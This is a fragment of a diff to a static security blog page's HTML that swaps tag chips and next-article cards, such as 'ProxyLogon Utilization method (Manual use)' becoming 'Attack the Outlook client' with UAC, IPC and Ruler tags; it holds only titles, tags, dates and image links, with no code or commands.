+                        <span class="chip bg-color">Bypass</span>
                     </a>
                     
-                    <a href="/tags/Exchange/">
-                        <span class="chip bg-color">Exchange</span>
+                    <a href="/tags/UAC/">
+                        <span class="chip bg-color">UAC</span>
                     </a>
                     
-                    <a href="/tags/Information-collection/">
-                        <span class="chip bg-color">Information collection</span>
-                    </a>
-                    
-                    <a href="/tags/Export-Email/">
-                        <span class="chip bg-color">Export Email</span>
-                    </a>
-                    
-                    <a href="/tags/Search-Email/">
-                        <span class="chip bg-color">Search Email</span>
+                    <a href="/tags/IPC/">
+                        <span class="chip bg-color">IPC</span>
                     </a>
                     
                 </div>
@@ -927,12 +714,12 @@ __VIEWSTATEGENERATOR&#x3D;362253EF<span aria-hidden="true" class="line-numbers-r
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/07/27/proxylogon-utilization-method-manual-use/">
+                <a href="/2021/08/04/attack-the-outlook-client/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.44.18.png" class="responsive-img" alt="ProxyLogon Utilization method (Manual use)">
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Attack%20the%20Outlook%20client/image-20210803153315676.png" class="responsive-img" alt="Attack the Outlook client">
                         
-                        <span class="card-title">ProxyLogon Utilization method (Manual use)</span>
+                        <span class="card-title">Attack the Outlook client</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -943,7 +730,7 @@ __VIEWSTATEGENERATOR&#x3D;362253EF<span aria-hidden="true" class="line-numbers-r
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-27
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-04
                             </span>
                         <span class="publish-author">
                             
@@ -968,20 +755,16 @@ __VIEWSTATEGENERATOR&#x3D;362253EF<span aria-hidden="true" class="line-numbers-r
                         <span class="chip bg-color">Exchange</span>
                     </a>
                     
+                    <a href="/tags/Ruler/">
+                        <span class="chip bg-color">Ruler</span>
+                    </a>
+                    
                     <a href="/tags/RCE/">
                         <span class="chip bg-color">RCE</span>
                     </a>
                     
-                    <a href="/tags/ProxyLogon/">
-                        <span class="chip bg-color">ProxyLogon</span>
-                    </a>
-                    
-                    <a href="/tags/CVE-2021-26855/">
-                        <span class="chip bg-color">CVE-2021-26855</span>
-                    </a>
-                    
-                    <a href="/tags/CVE-2021-27065/">
-                        <span class="chip bg-color">CVE-2021-27065</span>
+                    <a href="/tags/Outlook/">
+                        <span class="chip bg-color">Outlook</span>
                     </a>
                     
                 </div>
